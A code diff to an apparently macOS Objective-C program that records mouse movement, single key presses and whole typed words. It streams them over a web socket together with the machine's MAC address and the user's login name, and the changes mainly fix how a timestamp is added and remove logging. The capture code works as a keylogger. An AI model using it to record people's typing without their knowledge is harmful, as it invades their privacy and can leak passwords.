@@ -271,12 +271,12 @@ NSDictionary *ACTION_TYPES;
                     CGFloat posX = location.x;
                     CGFloat posY = location.y;
                 
-                    NSDictionary *keyData = [NSDictionary dictionaryWithObjectsAndKeys:
-                                             [NSNumber numberWithFloat:posX], @"posX",
-                                             [NSNumber numberWithFloat:posY], @"posY",
-                                             [NSNumber numberWithFloat:deltaX], @"deltaX",
-                                             [NSNumber numberWithFloat:deltaY], @"deltaY",
-                                             nil];
+                    NSMutableDictionary *keyData = [NSMutableDictionary dictionaryWithObjectsAndKeys:
+                                                    [NSNumber numberWithFloat:posX], @"posX",
+                                                    [NSNumber numberWithFloat:posY], @"posY",
+                                                    [NSNumber numberWithFloat:deltaX], @"deltaX",
+                                                    [NSNumber numberWithFloat:deltaY], @"deltaY",
+                                                    nil];
                 
                     self.cursorDeltaX = [NSNumber numberWithFloat:deltaX];
                     self.cursorDeltaY = [NSNumber numberWithFloat:deltaY];
@@ -318,9 +318,9 @@ NSDictionary *ACTION_TYPES;
                     
                     // Only report key if it's a character we want to track
                     if (trackChar) {
-                        NSDictionary *keyData = [NSDictionary dictionaryWithObjectsAndKeys:
-                                                 _char, @"keyPressed",
-                                                 nil];
+                        NSMutableDictionary *keyData = [NSMutableDictionary dictionaryWithObjectsAndKeys:
+                                                        _char, @"keyPressed",
+                                                        nil];
                     
                         [self reportToSocket:@"KEY_DOWN" :keyData];
                     }
@@ -335,9 +335,9 @@ NSDictionary *ACTION_TYPES;
                     // If it's a separator & currentWord is not empty
                     } else if ([self isSeparator:_char:_keyCode:keyCode] && [currentWord length] > 0) {
                         // Send the word just typed and we re-init currentWord
-                        NSDictionary *keyData = [NSDictionary dictionaryWithObjectsAndKeys:
-                                                 currentWord, @"word",
-                                                 nil];
+                        NSMutableDictionary *keyData = [NSMutableDictionary dictionaryWithObjectsAndKeys:
+                                                        currentWord, @"word",
+                                                        nil];
                         [self reportToSocket:@"WORD" :keyData];
                         currentWord = @"";
                         
@@ -447,7 +447,7 @@ NSDictionary *ACTION_TYPES;
  * @function        reportToSocket
  * @description     report event to web socket
 **/
-- (void)reportToSocket:(NSString*)type :(NSDictionary*)eventData {
+- (void)reportToSocket:(NSString*)type :(NSMutableDictionary*)eventData {
     // If client not connected
     if (clientID == 0){
         return;
@@ -455,23 +455,17 @@ NSDictionary *ACTION_TYPES;
     
     NSError *error;
     NSString *requestJson;
-    NSDictionary *finalDataObject;
     NSString *callType = type;
     
     // Add date to data if type is ACTION_TYPE
     if ([ACTION_TYPES objectForKey:type] != nil) {
         NSString *timeStampValue = [NSString stringWithFormat:@"%ld", (long)[[NSDate date] timeIntervalSince1970]];
         callType = [ACTION_TYPES objectForKey:type];
-        
-        NSLog(@"timestamp : %@", timeStampValue);
-        
         [eventData setValue:timeStampValue forKey:@"date"];
     }
     
-    NSLog(@"reportToSocket : %@", callType);
-    
-    finalDataObject = [NSDictionary dictionaryWithObjectsAndKeys:
-                                     [ACTION_TYPES objectForKey:type], @"type",
+    NSDictionary *finalDataObject = [NSDictionary dictionaryWithObjectsAndKeys:
+                                     callType, @"type",
                                      eventData, @"data",
                                     [NSString stringWithFormat:@"%d", clientID], @"id",
                                      nil];
@@ -482,9 +476,8 @@ NSDictionary *ACTION_TYPES;
     
     if (jsonData) {
         requestJson = [[NSString alloc] initWithData:jsonData encoding:NSUTF8StringEncoding];
+        [_webSocket send:requestJson];
     }
-    
-    [_webSocket send:requestJson];
 }
 
 
@@ -495,10 +488,10 @@ NSDictionary *ACTION_TYPES;
 - (void)confirmClientConnection {
     MacAddress *macAddress = [[MacAddress alloc] init];
     
-    NSDictionary *connectionData = [NSDictionary dictionaryWithObjectsAndKeys:
-                                     [macAddress getMacAddress], @"mac",
-                                     NSUserName(), @"username",
-                                     nil];
+    NSMutableDictionary *connectionData = [NSMutableDictionary dictionaryWithObjectsAndKeys:
+                                           [macAddress getMacAddress], @"mac",
+                                            NSUserName(), @"username",
+                                           nil];
     
     [self reportToSocket:@"auth" :connectionData];
 }
